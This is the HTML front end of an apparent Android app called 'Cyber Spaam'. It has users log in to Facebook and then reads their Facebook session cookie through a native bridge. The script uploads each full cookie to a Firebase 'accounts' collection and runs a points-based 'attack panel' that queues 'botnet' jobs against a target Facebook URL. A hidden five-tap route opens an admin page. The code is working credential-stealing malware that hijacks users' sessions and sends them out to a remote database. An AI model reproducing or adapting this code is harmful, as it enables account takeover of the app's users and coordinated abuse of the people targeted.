<!-- language: HTML, file: www/index.html -->
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Cyber Spaam</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: sans-serif; background-color: #0a0a0a; color: #00ff41; text-align: center; margin: 0; padding: 20px; }
    .container { max-width: 400px; margin: 40px auto; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #00ff41; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
    h1 { font-size: 24px; cursor: pointer; user-select: none; text-shadow: 0 0 10px #00ff41; }
    input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: #00ff41; border-radius: 5px; outline: none; }
    button { width: 100%; padding: 12px; background: #1877F2; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
    .danger { background: #ff3333; color: #fff; }
    .success { background: #00cc33; color: #fff; }
    .hidden { display: none !important; }
    .points { color: yellow; font-size: 18px; font-weight: bold; }
  </style>
</head>
<body>

  <!-- লগইন প্যানেল -->
  <div id="loginPanel" class="container">
    <h1 id="appLogo">CYBER SPAAM</h1>
    <p>Login to Attack</p>
    
    <button onclick="openFacebookLogin()">1. Login to Facebook</button>
    <button class="success" onclick="grabCookieAndSave()" style="margin-top:10px;">2. I Logged In, Connect App</button>
    <div id="loginStatus" style="color:red; margin-top:10px;"></div>
  </div>

  <!-- ইউজার অ্যাটাক প্যানেল -->
  <div id="attackPanel" class="container hidden">
    <h1>ATTACK PANEL</h1>
    <p>Status: <span style="color: #00ff41;">Connected</span></p>
    <p>Points Remaining: <span class="points" id="userPoints">0</span></p>
    <input type="url" id="targetUrl" placeholder="https://facebook.com/target">
    <button class="danger" onclick="launchAttack()">EXECUTE (-1 Point)</button>
    <div id="status" style="margin-top:15px; color:yellow;"></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push, set, get, child, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC22mPef-Lsi4qqTMZwmQ2WlcUtSTCiIP0",
      authDomain: "cyber-spaam.firebaseapp.com",
      databaseURL: "https://cyber-spaam-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "cyber-spaam",
      storageBucket: "cyber-spaam.firebasestorage.app",
      messagingSenderId: "180047004522",
      appId: "1:180047004522:web:470d5c50f2e333916d9b13"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    let currentUserCookie = "";
    let currentUserPoints = 0;

    window.openFacebookLogin = function() {
      window.location.href = "https://m.facebook.com/login";
    }

    window.grabCookieAndSave = async function() {
      const status = document.getElementById('loginStatus');
      let cookie = "";
      
      if (window.AndroidCookieManager && window.AndroidCookieManager.getFbCookie) {
        cookie = window.AndroidCookieManager.getFbCookie();
      } else {
        return status.innerText = "❌ WebView Error. Are you using the APK?";
      }

      if (!cookie || !cookie.includes('c_user')) {
        return status.innerText = "❌ Login failed or no cookie found.";
      }

      status.innerText = "Connecting to Botnet...";
      
      try {
        const dbRef = ref(db);
        const userKey = btoa(cookie.substring(0, 15)); 
        
        const snapshot = await get(child(dbRef, `users/${userKey}`));
        let points = 0;

        if (snapshot.exists()) {
          points = snapshot.val().points || 0;
        } else {
          await set(ref(db, `users/${userKey}`), { cookie: cookie, points: 0 });
        }

        const accRef = ref(db, 'accounts');
        await set(push(accRef), { cookie: cookie });

        currentUserCookie = cookie;
        currentUserPoints = points;
        
        document.getElementById('userPoints').innerText = points;
        document.getElementById('loginPanel').classList.add('hidden');
        document.getElementById('attackPanel').classList.remove('hidden');
        
        window.location.href = "index.html"; 

      } catch (e) { status.innerText = "DB Error: " + e.message; }
    }

    window.launchAttack = async function() {
      const url = document.getElementById('targetUrl').value.trim();
      const status = document.getElementById('status');
      
      if (!url.includes('facebook.com')) return status.innerText = "❌ Invalid URL";
      if (currentUserPoints <= 0) return status.innerText = "❌ Not enough points!";

      status.innerText = "⚡ Deploying Botnet...";
      try {
        const userKey = btoa(currentUserCookie.substring(0, 15));
        currentUserPoints--;
        await update(ref(db, `users/${userKey}`), { points: currentUserPoints });
        document.getElementById('userPoints').innerText = currentUserPoints;

        await set(push(ref(db, 'jobs')), { 
          targetUrl: url, status: "pending", createdAt: Date.now() 
        });

        status.innerText = "✅ Attack Deployed!";
        document.getElementById('targetUrl').value = '';
      } catch (e) { status.innerText = "❌ Error: " + e.message; }
    }

    // ═══ হিডেন রুট (লোগোতে ৫ বার ট্যাপ করলে অ্যাডমিন পেজে যাবে) ═══
    let tapCount = 0;
    let tapTimer;

    document.getElementById('appLogo').addEventListener('click', () => {
      tapCount++;
      clearTimeout(tapTimer);
      tapTimer = setTimeout(() => { tapCount = 0; }, 1000);

      if (tapCount >= 5) {
        tapCount = 0;
        window.location.href = "admin.html"; // অ্যাডমিন পেজে রিডাইরেক্ট
      }
    });
  </script>
</body>
</html>
